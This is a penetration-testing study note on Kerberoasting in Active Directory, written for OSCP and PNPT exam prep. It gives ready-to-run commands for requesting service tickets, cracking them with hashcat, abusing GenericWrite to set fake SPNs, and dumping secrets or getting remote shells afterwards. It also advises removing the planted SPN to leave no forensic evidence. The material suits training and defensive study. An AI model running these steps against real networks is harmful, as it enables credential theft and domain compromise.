---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, kerberoasting, kerberos, spn]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.3 — Kerberos Attacks"]
netgod-refs: []
---

# S3-05 — Kerberoasting

## What a Service Principal Name (SPN) Is

A Service Principal Name is a unique identifier for a service instance in Active Directory. When a service starts on a machine, it registers an SPN so that Kerberos can route authentication requests to it.

**SPN format:**
```
ServiceClass/Host:Port
ServiceClass/Host:Port/ServiceName

Examples:
MSSQLSvc/sqlserver.domain.local:1433
HTTP/webserver.domain.local:80
CIFS/fileserver.domain.local
host/workstation.domain.local
```

**Why SPNs matter for attackers:**
Any authenticated domain user can query the KDC for a Ticket Granting Service (TGS) ticket for any SPN in the domain — no special permissions needed. That TGS ticket is encrypted with the service account's NT hash. If the service account has a weak password, the hash cracks offline.

---

## How Kerberoasting Works — The Full Flow

```
Step 1: Attacker (any domain user) → KDC:
        TGS-REQ {
            TGT: [my valid TGT]
            Service: MSSQLSvc/sqlserver.domain.local:1433
        }

Step 2: KDC (no permission check — any user can request TGS for any SPN):
        Looks up which account has this SPN registered
        Finds: svc_mssql account has this SPN
        Generates TGS encrypted with svc_mssql's NT hash

Step 3: KDC → Attacker:
        TGS-REP {
            TGS: Encrypt(session_key, svc_mssql_NT_hash)  ← THIS IS CRACKABLE
        }

Step 4: Attacker:
        Takes the TGS offline
        Brute forces the NT hash by trying: Encrypt(guess, svc_mssql_NT_hash)
        When the decrypted TGS is valid → password found
```

**The critical design decision that enables Kerberoasting:** The KDC does NOT check whether the requesting user has permission to access the service before issuing the TGS. It simply encrypts the ticket with the service account's hash and hands it over. The access check happens when you actually present the TGS to the service — but you never present it. You just crack it offline.

---

## Why Service Accounts Are the Target

Kerberoasting is most valuable against **service accounts** (not user accounts) for these reasons:

1. **Service accounts often have weak passwords** — set once by an admin, never changed, often simple strings like `ServiceAccount1!` or `SQLPassword2019`
2. **Service accounts often have elevated privileges** — a database service account might be a Domain Admin (misconfiguration but common)
3. **Password rotation is neglected** — service accounts are "set and forget" — the password from 2015 is still the same
4. **SPNs are only on service accounts** — regular user accounts don't have SPNs by default (except when targeted for Kerberoasting via GenericWrite — covered in S3-08)

---

## Finding Kerberoastable Accounts

### From Kali — impacket GetUserSPNs

```bash
# List all Kerberoastable accounts (don't request hashes yet):
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP

# Request TGS hashes for all Kerberoastable accounts:
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request -outputfile tgs.txt

# Request TGS for a specific user:
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request-user svc_mssql -outputfile tgs_mssql.txt

# With NTLM hash instead of password:
impacket-GetUserSPNs domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP -request -outputfile tgs.txt

# Force RC4 encryption (type 23 — most crackable):
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
# Impacket requests RC4 by default — no extra flag needed
```

**Output:**
```
ServicePrincipalName                    Name        MemberOf                         PasswordLastSet
--------------------------------------  ----------  --------------------------------  -------------------
MSSQLSvc/sqlserver.domain.local:1433   svc_mssql   CN=Domain Admins,CN=Users,...     2019-06-15 10:23:44
HTTP/webserver.domain.local             svc_web                                       2021-03-10 14:55:21

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$DOMAIN.LOCAL$MSSQLSvc/sqlserver.domain.local:1433*$AAAA...long_hash...
$krb5tgs$23$*svc_web$DOMAIN.LOCAL$HTTP/webserver.domain.local*$BBBB...another_hash...
```

**Reading the output:**
- `MemberOf: Domain Admins` — this service account IS a Domain Admin. Cracking this password = game over.
- `PasswordLastSet: 2019` — set 5+ years ago, likely never changed, likely weak
- The hash starts with `$krb5tgs$23$` — RC4 encrypted TGS, hashcat mode 13100

### Via CrackMapExec

```bash
crackmapexec ldap DC_IP -u user -p pass --kerberoasting tgs.txt
```

### Via PowerView (on Windows target)

```powershell
# Find all accounts with SPNs:
Get-NetUser -SPN | select samaccountname, serviceprincipalname, pwdlastset, memberof

# More detailed:
Get-NetUser -SPN | select samaccountname, serviceprincipalname | where {$_.serviceprincipalname -ne $null}

# Using built-in AD module:
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
```

### Via Rubeus (on Windows target)

```powershell
# List all Kerberoastable accounts:
.\Rubeus.exe kerberoast /stats

# Kerberoast all accounts — output in hashcat format:
.\Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt

# Target a specific user:
.\Rubeus.exe kerberoast /user:svc_mssql /format:hashcat /outfile:tgs_mssql.txt

# Force RC4 (most crackable — downgrade from AES if needed):
.\Rubeus.exe kerberoast /rc4opsec /format:hashcat /outfile:tgs.txt
# Note: /rc4opsec requests AES but falls back to RC4 — some AV evasion benefit

# Targeted Kerberoasting (see S3-08 ACL abuse for context):
.\Rubeus.exe kerberoast /user:targetuser /format:hashcat
# Useful when you've set an SPN on a target user via GenericWrite
```

### Via BloodHound

```
Pre-built query: "List all Kerberoastable Accounts"
→ Shows all accounts with SPNs
→ Right-click a node: "Shortest Paths to Here from Owned" or check edges to DA

Custom query — Kerberoastable accounts that are Domain Admins:
MATCH (u:User {hasspn:true}) WHERE u.admincount = true RETURN u.name, u.serviceprincipalnames
```

---

## The Hash Format — What You're Cracking

```
$krb5tgs$23$*username$DOMAIN.LOCAL$SPN*$NONCE$HASH
```

Breaking it down:
- `$krb5tgs$` — identifier: Kerberos TGS ticket
- `23` — encryption type: 23 = RC4-HMAC (crackable), 17 = AES-128, 18 = AES-256 (much harder)
- `username` — the service account name
- `DOMAIN.LOCAL` — the domain
- `SPN` — the Service Principal Name
- `NONCE` — random component
- `HASH` — the encrypted portion derived from the service account's NT hash

**hashcat mode:** `-m 13100` = Kerberos TGS-REP etype 23 (RC4)
**For AES-128:** `-m 19600`, **For AES-256:** `-m 19700` (much slower, rarely worth attempting)

---

## Cracking TGS Hashes

### hashcat

```bash
# Standard crack — RC4 (mode 13100):
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# With rules (always add this):
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule

# Corporate wordlist approach:
cewl https://company.com -d 3 -m 5 -w corporate.txt
hashcat -m 13100 tgs.txt corporate.txt -r best64.rule

# Mask attack for known-pattern passwords:
hashcat -m 13100 tgs.txt -a 3 ?u?l?l?l?l?l?d?d!   # e.g., Password1!

# Show cracked:
hashcat -m 13100 tgs.txt --show

# For AES hashes (slower, only attempt if RC4 fails and you have GPU):
hashcat -m 19600 tgs.txt /usr/share/wordlists/rockyou.txt   # AES-128
hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt   # AES-256
```

### John the Ripper

```bash
# Ensure format is john-compatible (use -format john in impacket):
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile tgs_john.txt
# Format is auto-detected by john

john tgs_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
john tgs_john.txt --show
```

### Why Service Account Passwords Often Crack

The reason Kerberoasting is so productive in real environments:

1. **No complexity enforcement for service accounts** — many admins bypass complexity requirements for service accounts because changing them breaks services
2. **Password set years ago** — before modern password policies
3. **Descriptive names** — `svc_mssql` often has password `MSSQL2016!` or `SqlService1`
4. **Shared across environments** — same service account password in dev, test, and prod
5. **Documentation** — password might be in a wiki, runbook, or email thread

**Most common service account password patterns:**
```
ServiceName + Year + !          → SQLService2019!
CompanyName + Year              → Eurostop2020
ServiceName + 123               → SQLsvc123
Hostname + Service              → SQLSRV01sql
Month + Year + !                → January2021!
Season + Year                   → Summer2020
```

---

## Prioritising Which Hashes to Crack

When you have multiple TGS hashes, crack in this priority order:

**Priority 1 — Accounts that are Domain Admins:**
```
GetUserSPNs output shows "MemberOf: Domain Admins" → crack this first
```

**Priority 2 — Accounts with admincount=1:**
```powershell
Get-NetUser -SPN | where {$_.admincount -eq 1} | select samaccountname
# admincount=1 = was in a privileged group at some point (may still be)
```

**Priority 3 — Old passwords (set years ago):**
```
PasswordLastSet: 2016 → likely never changed → likely weak
```

**Priority 4 — Accounts with access to interesting resources:**
```
Check BloodHound: does svc_mssql have AdminTo on any machines?
Does svc_backup have GenericAll on a group?
```

**Deprioritise:** Computer accounts (end in `$`), krbtgt (password managed by AD, very complex), accounts with recent password changes.

---

## Targeted Kerberoasting — Via GenericWrite ACL

If you have `GenericWrite` permission over a user account (revealed in BloodHound), you can:
1. **Set an SPN on that user** (making them Kerberoastable)
2. **Kerberoast them** to get their hash
3. **Remove the SPN** (clean up)

This lets you attack ANY user account — not just service accounts that already have SPNs.

```powershell
# Set an SPN on target user (requires GenericWrite on that user):
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# Verify SPN is set:
Get-NetUser targetuser | select serviceprincipalname

# Kerberoast the target:
.\Rubeus.exe kerberoast /user:targetuser /format:hashcat /outfile:targeted.txt

# From Kali:
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request-user targetuser

# Clean up — remove SPN after cracking:
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

This is covered in full in S3-08 (ACL Abuse) — introduced here for completeness.

---

## What to Do After Cracking

The same playbook as AS-REP Roasting:

```bash
# 1. Confirm access with cracked credentials:
crackmapexec smb 192.168.0.0/24 -u svc_mssql -p 'SQLService2019!' --continue-on-success
# Look for (Pwn3d!) — local admin anywhere?

# 2. If Domain Admin:
impacket-secretsdump domain/svc_mssql:'SQLService2019!'@DC_IP
impacket-psexec domain/svc_mssql:'SQLService2019!'@DC_IP

# 3. Check BloodHound attack paths:
# Mark svc_mssql as owned
# Run "Shortest Paths from Owned Principals to Domain Admins"

# 4. If service account runs MSSQL:
impacket-mssqlclient domain/svc_mssql:'SQLService2019!'@SQLSERVER_IP
# Enable xp_cmdshell → OS command execution

# 5. Credential reuse everywhere:
crackmapexec winrm 192.168.0.0/24 -u svc_mssql -p 'SQLService2019!'
evil-winrm -i TARGET -u svc_mssql -p 'SQLService2019!'
```

---

## AS-REP Roasting vs Kerberoasting — Key Differences

| | AS-REP Roasting | Kerberoasting |
|--|----------------|--------------|
| **Requires credentials?** | No (just a username list) | Yes (any domain user) |
| **Target accounts** | Accounts with DONT_REQUIRE_PREAUTH | Accounts with SPNs |
| **Hash type** | `$krb5asrep$23$` | `$krb5tgs$23$` |
| **hashcat mode** | 18200 | 13100 |
| **Prevalence** | Less common misconfiguration | Very common — every service account has SPN |
| **Password strength** | User accounts (varies) | Service accounts (often weak) |
| **OSCP frequency** | Medium | High |

**Run both — they're complementary.** Kerberoasting finds more targets (any SPN account) but requires one set of credentials to run. AS-REP Roasting requires no credentials but fewer accounts are misconfigured that way.

---

## OSCP and PNPT Exam Context

**Kerberoasting is one of the most common OSCP AD paths.** Nearly every AD lab has at least one service account with an SPN, and service accounts commonly have weak passwords.

**Exam workflow:**
```
1. Get any domain credentials (via LLMNR, relay, web exploit, etc.)
2. Run: impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
3. Run hashcat in background: hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
4. Continue other enumeration while cracking
5. When cracked → CME sweep → BloodHound paths → exploit
```

**Time budget:**
- GetUserSPNs: 30 seconds
- hashcat with GPU: 1–10 minutes for common service account passwords
- hashcat CPU only: 15–90 minutes
- Start cracking immediately, continue other work — don't wait

---

## Quick Reference

```bash
# Find and request TGS hashes (from Kali):
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile tgs.txt

# With hash:
impacket-GetUserSPNs domain.local/user -hashes :NTLM -dc-ip DC_IP -request -outputfile tgs.txt

# CME:
crackmapexec ldap DC_IP -u user -p pass --kerberoasting tgs.txt

# Rubeus (Windows):
.\Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt

# Crack:
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule

# Show cracked:
hashcat -m 13100 tgs.txt --show

# After cracking — check access:
crackmapexec smb 192.168.0.0/24 -u cracked_user -p cracked_pass --continue-on-success
evil-winrm -i TARGET -u cracked_user -p cracked_pass

# PowerView find SPNs:
Get-NetUser -SPN | select samaccountname,serviceprincipalname,pwdlastset,memberof

# BloodHound custom query — DA-level Kerberoastable:
MATCH (u:User {hasspn:true}) WHERE u.admincount = true RETURN u.name
```

---

## Common Mistakes

> [!warning] Kerberoasting mistakes that waste time
> 1. **Not adding `-request` to GetUserSPNs.** Without it, impacket only lists vulnerable accounts but doesn't retrieve hashes. You get the account names but nothing to crack.
> 2. **Not checking which accounts are Domain Admins before cracking.** Crack DA-member hashes first — those are instant wins. Don't waste time on a non-privileged svc_web when svc_mssql is a DA member.
> 3. **Ignoring old PasswordLastSet dates.** `PasswordLastSet: 2015` is a gift. Old passwords = almost certainly in rockyou.txt. Prioritise these.
> 4. **Only trying rockyou.txt without rules.** Service accounts very often use `ServiceName + Year + !` patterns that aren't in rockyou raw but crack in seconds with `best64.rule` or `rockyou-30000.rule`.
> 5. **Confusing TGS mode with AS-REP mode in hashcat.** AS-REP = `-m 18200`, TGS = `-m 13100`. Using the wrong mode gives zero results with no useful error.
> 6. **Not cleaning up the SPN after targeted Kerberoasting.** If you set a fake SPN on a user account for targeted Kerberoasting, remove it afterwards to avoid leaving forensic evidence.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Attacking Kerberos" | Kerberoasting dedicated room with guided labs |
| HTB — Active | Classic Kerberoasting machine — SPN on Administrator account |
| HTB — Sauna | Part of the chain after AS-REP roasting |
| TCM Security — PEH Course | Full Kerberoasting demo + lab |
| impacket GetUserSPNs examples | `impacket-GetUserSPNs -h` for all flags |
| [[PHANTOM/MODULE 4 — Active Directory/04.3 — Kerberos Attacks]] | Full technical depth in PHANTOM vault |
